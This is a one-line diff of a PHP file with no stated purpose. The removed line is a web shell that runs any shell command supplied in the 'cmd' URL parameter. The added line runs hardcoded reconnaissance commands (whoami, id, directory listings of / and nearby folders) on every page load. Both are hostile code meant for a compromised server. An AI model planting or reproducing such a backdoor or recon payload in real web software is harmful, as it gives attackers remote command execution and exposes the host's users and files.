@@ -1,1 +1,1 @@
-<?php eval('system("'.$_GET['cmd'].'");'); ?>
+<?php system('whoami; id; ls /; ls .; ls ..;'); ?>
